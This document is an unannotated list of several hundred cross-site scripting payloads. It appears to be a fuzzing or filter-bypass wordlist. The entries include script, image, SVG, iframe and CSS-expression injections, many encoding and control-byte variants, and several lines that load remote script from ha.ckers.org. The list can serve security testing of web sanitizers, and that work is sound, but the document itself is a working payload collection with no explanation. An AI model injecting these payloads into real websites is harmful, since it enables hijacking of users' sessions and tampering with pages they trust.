<IMG SRC="livescript:[code]">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<XSS STYLE='no\xss:noxss("*//*");
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
getURL("javascript:alert('XSS')")
a="get";
<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
<HTML><BODY>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>        
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
<object onError object onError="javascript:javascript:alert(1)"></object onError>
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
<body onload body onload="javascript:javascript:alert(1)"></body onload>
<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
\x3Cscript>javascript:alert(1)</script>
'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
<script>javascript:alert(1)</script\x0D
<script>javascript:alert(1)</script\x0A
<script>javascript:alert(1)</script\x0B
<script charset="\x22>javascript:alert(1)</script>
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
`"'><img src='#\x27 onerror=javascript:alert(1)>
<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
<script>/* *\x2A/javascript:alert(1)// */</script>
<script>/* *\x00/javascript:alert(1)// */</script>
<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
<script src="data:\xD4\x8F,javascript:alert(1)"></script>
<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
<script src="data:\xCB\x8F,javascript:alert(1)"></script>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
ABC<div style="x:expression\x00(javascript:alert(1)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x09expression(javascript:alert(1)">DEF
ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
ABC<div style="x:\x20expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
ABC<div style="x:\x00expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
"`'><script>\x3Bjavascript:alert(1)</script>
"`'><script>\x0Djavascript:alert(1)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
"`'><script>\xE2\x80\x81javascript:alert(1)</script>
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
"`'><script>\xE3\x80\x80javascript:alert(1)</script>
"`'><script>\x09javascript:alert(1)</script>
"`'><script>\xE2\x80\x89javascript:alert(1)</script>
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
"`'><script>\xE2\x80\x88javascript:alert(1)</script>
"`'><script>\x00javascript:alert(1)</script>
"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
"`'><script>\x0Cjavascript:alert(1)</script>
"`'><script>\x2Bjavascript:alert(1)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
"`'><script>-javascript:alert(1)</script>
"`'><script>\x0Ajavascript:alert(1)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
"`'><script>\x7Ejavascript:alert(1)</script>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
"`'><script>\xC2\x85javascript:alert(1)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x80javascript:alert(1)</script>
"`'><script>\x21javascript:alert(1)</script>
"`'><script>\xE2\x80\x82javascript:alert(1)</script>
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
"`'><script>\x0Bjavascript:alert(1)</script>
"`'><script>\x20javascript:alert(1)</script>
"`'><script>\xC2\xA0javascript:alert(1)</script>
"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
<script\x2F>javascript:alert(1)</script>
<script\x20>javascript:alert(1)</script>
<script\x0D>javascript:alert(1)</script>
<script\x0A>javascript:alert(1)</script>
<script\x0C>javascript:alert(1)</script>
<script\x00>javascript:alert(1)</script>
<script\x09>javascript:alert(1)</script>
`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
<script>javascript:alert(1)<\x00/script>
<img src=# onerror\x3D"javascript:alert(1)" >
<input onfocus=javascript:alert(1) autofocus>
<input onblur=javascript:alert(1) autofocus><input autofocus>
<video poster=javascript:javascript:alert(1)//
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
<video><source onerror="javascript:javascript:alert(1)">
<video onerror="javascript:javascript:alert(1)"><source>
<form><button formaction="javascript:javascript:alert(1)">X
<body oninput=javascript:alert(1)><input autofocus>
<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
<frameset onload=javascript:alert(1)>
<table background="javascript:javascript:alert(1)">
<!--<img src="--><img src=x onerror=javascript:alert(1)//">
<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
<![><img src="]><img src=x onerror=javascript:alert(1)//">
<style><img src="</style><img src=x onerror=javascript:alert(1)//">
<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<object data="data:text/html;base64,%(base64)s">
<embed src="data:text/html;base64,%(base64)s">
<b <script>alert(1)</script>0
<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
<? foo="><script>javascript:alert(1)</script>">
<! foo="><script>javascript:alert(1)</script>">
</ foo="><script>javascript:alert(1)</script>">
<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
<% foo><x foo="%><script>javascript:alert(1)</script>">
<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<img \x00src=x onerror="alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x11src=x onerror="javascript:alert(1)">
<img \x12src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x10src=x onerror="javascript:alert(1)">
<img\x13src=x onerror="javascript:alert(1)">
<img\x32src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x11src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x34src=x onerror="javascript:alert(1)">
<img \x39src=x onerror="javascript:alert(1)">
<img \x00src=x onerror="javascript:alert(1)">
<img src\x09=x onerror="javascript:alert(1)">
<img src\x10=x onerror="javascript:alert(1)">
<img src\x13=x onerror="javascript:alert(1)">
<img src\x32=x onerror="javascript:alert(1)">
<img src\x12=x onerror="javascript:alert(1)">
<img src\x11=x onerror="javascript:alert(1)">
<img src\x00=x onerror="javascript:alert(1)">
<img src\x47=x onerror="javascript:alert(1)">
<img src=x\x09onerror="javascript:alert(1)">
<img src=x\x10onerror="javascript:alert(1)">
<img src=x\x11onerror="javascript:alert(1)">
<img src=x\x12onerror="javascript:alert(1)">
<img src=x\x13onerror="javascript:alert(1)">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<img src=x onerror=\x09"javascript:alert(1)">
<img src=x onerror=\x10"javascript:alert(1)">
<img src=x onerror=\x11"javascript:alert(1)">
<img src=x onerror=\x12"javascript:alert(1)">
<img src=x onerror=\x32"javascript:alert(1)">
<img src=x onerror=\x00"javascript:alert(1)">
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src onerror /" '"= alt=javascript:alert(1)//">
<title onpropertychange=javascript:alert(1)></title><title title=>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<!--[if]><script>javascript:alert(1)</script -->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<script src="/\%(jscript)s"></script>
<script src="\\%(jscript)s"></script>
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
<style>*[{}@import'%(css)s?]</style>X
<div style="font-family:'foo&#10;;color:red;';">XXX
<div style="font-family:foo}color=red;">XXX
<// style=x:expression\28javascript:alert(1)\29>
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
<div style=content:url(%(svg)s)></div>
<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
